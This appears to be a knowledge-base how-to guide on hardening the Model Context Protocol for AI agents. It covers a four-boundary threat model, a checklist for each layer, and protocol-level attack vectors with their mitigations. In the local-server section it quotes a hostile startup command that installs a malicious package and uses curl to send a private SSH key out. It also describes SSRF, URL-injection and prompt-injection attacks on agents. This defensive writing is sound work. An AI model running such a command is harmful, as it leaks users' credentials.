---
title: 'Hardening MCP: A Threat Model and Checklist'
diataxis: How-to Guide
domain: security-privacy
topic: ai-agent-security
source: DEV.to Tech News
source_url: https://dev.to/prabhu_kalyansamal_f743d/-mcp-security-threat-model-hardening-guide-2026--3enn
date: 2026-08-25
keywords:
- knowledge-base
- ai-agent-security
- security-privacy
- how-to
---
# Hardening MCP: A Threat Model and Checklist

MCP is the default way AI apps reach tools and data — and in most deployments it
is the **least-audited trust boundary** in the stack. The key reframe: MCP is not
one trust boundary, it is **four**.

```excalidraw
{
  "type": "drawing",
  "version": 2,
  "source": "https://github.com/excalidraw/excalidraw",
  "elements": [
    {
      "id": "b1",
      "type": "rectangle",
      "x": 40,
      "y": 160,
      "width": 200,
      "height": 90,
      "strokeColor": "#1e1e1e",
      "backgroundColor": "#d9ccff",
      "fillStyle": "solid",
      "strokeWidth": 2,
      "text": {
        "content": "LLM Agent\n(prompt context)",
        "fontSize": 14,
        "fontFamily": 1
      }
    },
    {
      "id": "b2",
      "type": "rectangle",
      "x": 300,
      "y": 160,
      "width": 200,
      "height": 90,
      "strokeColor": "#1e1e1e",
      "backgroundColor": "#c4e0f2",
      "fillStyle": "solid",
      "strokeWidth": 2,
      "text": {
        "content": "MCP Client\n(tools, resources)",
        "fontSize": 14,
        "fontFamily": 1
      }
    },
    {
      "id": "b3",
      "type": "rectangle",
      "x": 560,
      "y": 160,
      "width": 200,
      "height": 90,
      "strokeColor": "#1e1e1e",
      "backgroundColor": "#f9e0a3",
      "fillStyle": "solid",
      "strokeWidth": 2,
      "text": {
        "content": "MCP Server\n(exposed tools)",
        "fontSize": 14,
        "fontFamily": 1
      }
    },
    {
      "id": "b4",
      "type": "rectangle",
      "x": 820,
      "y": 160,
      "width": 200,
      "height": 90,
      "strokeColor": "#1e1e1e",
      "backgroundColor": "#f9d3d3",
      "fillStyle": "solid",
      "strokeWidth": 2,
      "text": {
        "content": "Host resources\nfiles, DB, network",
        "fontSize": 14,
        "fontFamily": 1
      }
    },
    [
      {
        "id": "b5",
        "type": "arrow",
        "x": 240,
        "y": 205,
        "width": 60,
        "height": 0,
        "strokeColor": "#1e1e1e",
        "backgroundColor": "transparent",
        "fillStyle": "solid",
        "strokeWidth": 2,
        "points": [
          [
            0,
            0
          ],
          [
            60,
            0
          ]
        ]
      }
    ],
    [
      {
        "id": "b6",
        "type": "arrow",
        "x": 500,
        "y": 205,
        "width": 60,
        "height": 0,
        "strokeColor": "#1e1e1e",
        "backgroundColor": "transparent",
        "fillStyle": "solid",
        "strokeWidth": 2,
        "points": [
          [
            0,
            0
          ],
          [
            60,
            0
          ]
        ]
      }
    ],
    [
      {
        "id": "b7",
        "type": "arrow",
        "x": 760,
        "y": 205,
        "width": 60,
        "height": 0,
        "strokeColor": "#1e1e1e",
        "backgroundColor": "transparent",
        "fillStyle": "solid",
        "strokeWidth": 2,
        "points": [
          [
            0,
            0
          ],
          [
            60,
            0
          ]
        ]
      },
      {
        "id": "b7_lbl",
        "type": "text",
        "x": 740,
        "y": 181,
        "width": 100,
        "height": 20,
        "text": "untrusted input",
        "fontSize": 13,
        "fontFamily": 1,
        "strokeColor": "#1e1e1e",
        "backgroundColor": "transparent"
      }
    ],
    {
      "id": "b8",
      "type": "rectangle",
      "x": 300,
      "y": 340,
      "width": 560,
      "height": 110,
      "strokeColor": "#1e1e1e",
      "backgroundColor": "#c9e7c9",
      "fillStyle": "solid",
      "strokeWidth": 2,
      "text": {
        "content": "Hardening: least-privilege tools, input validation,\nsandboxing / allow-lists, secret isolation, egress control",
        "fontSize": 14,
        "fontFamily": 1
      }
    }
  ]
}
```

## The four boundaries

| Boundary | Surface | Main risks | Highest-leverage fix |
| --- | --- | --- | --- |
| 1. Transport (host ↔ server) | discovery + tool calls | token theft, replay, SSRF via server URLs, poisoned discovery endpoints | pin server identities; scoped short-lived tokens |
| 2. Tool (model ↔ capability) | tool defs + args | over-broad scopes, description injection, parameter injection | build-time tool allowlist; sandboxed executors |
| 3. Data (retrieval ↔ context) | tool results | indirect prompt injection via attacker-controlled content | mark output untrusted; server-side URL allowlist |
| 4. Agent (planner ↔ side effects) | chained calls | compound risk from innocuous permission combos | one-shot credentials; human gate on irreversible actions |

The single highest-impact fix: **kill ambient credentials on stdio servers.** A
local stdio server inherits the user's OS permissions — a file-wrapping server
with full user context is a data-exfiltration pipe waiting for a confused model.

## Checklist by layer

### Transport

- Pin remote server identities (TLS + server allowlist); never trust bare URLs
  from user input.
- Run stdio servers as a dedicated low-privilege OS user; container/chroot where
  practical.
- Authenticate host-to-server with scoped, short-lived tokens — not a personal
  API key.
- Validate and log `Initialize` handshakes; reject unexpected capabilities.

### Server

- Allowlist enabled tools per client; disable everything else at build time.
- Sandbox tool executors: no ambient shell, explicit argv, timeouts, rlimits.
- Treat tool descriptions as production code — review their diffs like code.
- Rate-limit and audit every tool call: who, what, arguments, result digest.

### Data

- Mark untrusted tool output (web fetch, email bodies) in-context; instruct the
  model to treat it as data, never instructions.
- Filter/refetch URLs server-side against an allowlist; block loopback and
  metadata IPs.

### Agent

- One-shot / short-lived credentials for actions.
- Human gate on irreversible actions (send, delete, pay).
- Bound reachable permission *combinations*, not just individual tools.

### Engine-side: model-specific parsers

Tool-call formats differ per model (XML, JSON, Pythonic code), and each
engine ships a per-model parser for them. SGLang maintains an explicit
[per-model parser table](https://docs.sglang.ai/advanced_features/tool_parser.html)
(qwen, qwen3_coder, llama3, mistral, gpt-oss, ...), and the
[CVE-2025-9141](https://github.com/vllm-project/vllm/security/advisories/GHSA-79j6-g2m3-jgfw)
incident in vLLM's Qwen3-Coder parser shows what a buggy one costs. When
adding or upgrading a model: pin the engine version, review the parser's
handling of model-emitted data (no `eval`, no shell), and re-run the agent's
tool-allowlist against the new model's calling behavior.

## Protocol-level attack vectors (MCP Security Best Practices)

The four-boundary model above covers transport, tool, data, and agent. The official [MCP Security Best Practices](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices) document (complementing the 2026-07-28 authorization spec) names protocol-level vectors worth adding to the checklist:

- **Confused deputy in OAuth proxy servers.** An MCP proxy that (a) uses a *static* client ID with a third-party authorization server, (b) lets MCP clients *dynamically register* (each with their own `client_id`), and (c) the authorization server sets a *consent cookie* after the first authorization, can be exploited: a malicious link carrying a newly-registered `client_id` and attacker `redirect_uri` makes the authorization server skip the consent screen (the cookie is still present), and the authorization code is redirected to the attacker. Mitigation: per-client consent stored server-side *before* the third-party flow, exact `redirect_uri` matching (no wildcards), and signed `__Host-` consent cookies bound to a specific `client_id`.
- **Token passthrough.** A server that accepts and forwards tokens not issued to it (audience-validation failure, [RFC 9068](https://www.rfc-editor.org/rfc/rfc9068.html)) lets an attacker reuse a legitimate token across services, or use the server as an exfiltration proxy. Servers **MUST NOT** accept tokens not explicitly issued to them and **MUST** verify the audience claim.
- **SSRF via OAuth metadata discovery.** During discovery, clients fetch `resource_metadata` (from `WWW-Authenticate`), `authorization_servers` (Protected Resource Metadata), and `token_endpoint`/`authorization_endpoint` (Authorization Server Metadata) — all controllable by a malicious server and pointable at internal IPs, the cloud metadata service (`169.254.169.254`), or localhost services, plus DNS-rebinding and redirect-chain variants. Mitigation: require HTTPS (loopback `http` for dev only), block private/link-local ranges ([RFC 9728 §7.7](https://datatracker.ietf.org/doc/html/rfc9728#section-7.7)), validate redirect targets, use an egress proxy (e.g., [Smokescreen](https://github.com/stripe/smokescreen)), and pin DNS resolution between check and use. The same SSRF applies to authorization servers that fetch Client ID Metadata Document URLs.
- **State handle hijacking.** MCP is stateless; servers needing state across requests mint explicit handles (cart ID, workflow ID) and receive them as ordinary tool arguments. An attacker who obtains or guesses a handle can operate on another user's state unless the server binds the handle to the authenticated principal (e.g., key stored state as `<user_id>:<handle>` from a verified token) and verifies every inbound request.
- **Local MCP server compromise.** Locally-run `stdio` servers are attractive targets: a malicious "startup" command embedded in client config (e.g., `npx malicious-package && curl -d @~/.ssh/id_rsa …`), a malicious server payload, or an insecure local server reached via DNS rebinding. Mitigation: pre-configuration consent that shows the exact command, sandboxing/least privilege, and prefer `stdio` (client-only) or restrict the HTTP transport (authorization token, unix socket/IPC).
- **OAuth authorization URL validation.** A malicious server can supply `javascript:`, `data:`, or `file:` URLs as the authorization endpoint → client-side XSS/RCE, and shell command injection if the client opens the URL via `cmd.exe`/`sh`/PowerShell. Mitigation: allow only `http(s)` schemes (loopback `http` for development), never open URLs through a shell, apply CSP (`script-src 'self'`), sanitize URLs, and log suspicious ones.
- **Mix-up attacks ([RFC 9207](https://datatracker.ietf.org/doc/html/rfc9207)).** A malicious authorization server can try to have the client redeem a code/token issued by an honest server at the attacker's token endpoint. Mitigated by Authorization Response Validation, which binds the response to the authorization server the client recorded before the redirect (depends on honest servers emitting `iss`). PKCE alone does not prevent this.
- **Localhost redirect URI impersonation.** Native/local clients using `localhost` redirect URIs with Client ID Metadata Documents: the metadata proves domain control but not which local process is listening, so an attacker can claim to be any client by supplying the legitimate client's metadata URL as `client_id` and binding a localhost port. Authorization servers should warn on localhost-only redirect URIs and display the redirect-URI hostname during authorization.
- **Scope minimization.** Avoid publishing all scopes in `scopes_supported`, wildcard/omnibus scopes (`*`, `all`, `full-access`), or bundling unrelated privileges. Prefer a progressive least-privilege model: minimal initial scope, targeted `WWW-Authenticate` scope challenges when a privileged operation is first attempted, and server-side authorization logic rather than trusting the scopes a token claims.

## References

- [Model Context Protocol: Security Best Practices (official, 2026-07-28 spec)](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices)
- [MCP Security: Threat Model and Hardening Guide (2026)](https://dev.to/prabhu_kalyansamal_f743d/-mcp-security-threat-model-hardening-guide-2026--3enn)
- [SGLang tool-call parser documentation](https://docs.sglang.ai/advanced_features/tool_parser.html)
- [Safety and Security in the Model Context Protocol (Medium)](https://medium.com/@carlosm0303/safety-and-security-in-the-model-context-protocol-mcp-c6319778b150)
- [Hardening MCP: Advanced Threat Detection and Policy Enforcement (Security Boulevard, 2026-07) — policy-as-code PEP, why WAFs fall short](https://securityboulevard.com/2026/07/hardening-model-context-protocol-advanced-threat-detection-and-policy-enforcement/)
- [Palo Alto Unit 42: New Prompt Injection Attack Vectors Through MCP Sampling](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)

## Related
- [[explanation-openai-hugging-face-agent-incident]]
- [[explanation-lm-studio-bionic-shell-judge-auto-review]]
- [[explanation-llm-inference-engine-exploits]]
